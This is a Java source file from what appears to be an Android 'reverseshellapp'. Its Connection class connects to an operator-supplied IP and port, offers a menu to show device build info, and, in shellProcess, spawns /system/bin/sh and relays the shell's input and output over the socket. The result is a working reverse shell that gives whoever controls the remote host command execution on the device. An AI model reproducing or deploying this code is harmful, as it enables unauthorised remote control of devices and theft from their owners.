package com.example.reverseshellapp;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;

public class Connection {
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;

    public void startConnection(String ip, int port) throws IOException {
        socket = new Socket(ip, port);
        out = new PrintWriter(socket.getOutputStream(), true);
        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
    }

    public void sendFromClient(String fromClient) throws IOException {
        out.println(fromClient);
    }

    public String receiveFromServer() throws IOException {
        return in.readLine();
    }

    public void stopConnection() throws IOException {
        in.close();
        out.close();
        socket.close();
    }

    public String printConnetionInfo() {
        InetAddress localAddress = socket.getLocalAddress();
        int localPort = socket.getLocalPort();
        InetAddress remoteAddress = socket.getInetAddress();
        int remotePort = socket.getPort();
        String printOutput = "connect to " + remoteAddress.getHostAddress() + ":" + remotePort
                + " from " + localAddress.getHostAddress() + ":" + localPort
                + "\nChoose the number:\n1. Display device build info\n"
                + "2. Shell";
        return printOutput;
    }

    public void shellProcess() throws IOException {
        String SHELL_PATH = "/system/bin/sh";
        Process shell;
        DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

        shell = new ProcessBuilder(SHELL_PATH).redirectErrorStream(true).start();

        InputStream shellInputStream = shell.getInputStream();
        OutputStream shellOutputStream = shell.getOutputStream();
        InputStream shellErrorStream = shell.getErrorStream();

        InputStream socketInputStream = socket.getInputStream();
        OutputStream socketOutputStream = socket.getOutputStream();

        while (!socket.isClosed()) {
            try {
                while (shellInputStream.available() > 0) {
                    socketOutputStream.write(shellInputStream.read());
                }

                while (shellErrorStream.available() > 0) {
                    socketOutputStream.write(shellErrorStream.read());
                }

                while (socketInputStream.available() > 0) {
                    shellOutputStream.write(socketInputStream.read());
                }

                shellOutputStream.flush();
                socketOutputStream.flush();

            } catch (IOException e) {
                e.printStackTrace();
                shell.destroy();
            }

            try {
                Thread.sleep(50);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            try {
                shell.exitValue();
                break;
            } catch (IllegalThreadStateException e) {
                e.printStackTrace();
            }
        }
        dataOutputStream.write("─── ⋆⋅☆⋅⋆ ───── ⋆⋅☆⋅⋆ ──Exiting shell─── ⋆⋅☆⋅⋆ ───── ⋆⋅☆⋅⋆ ──\n".getBytes());
        shell.destroy();
    }
}
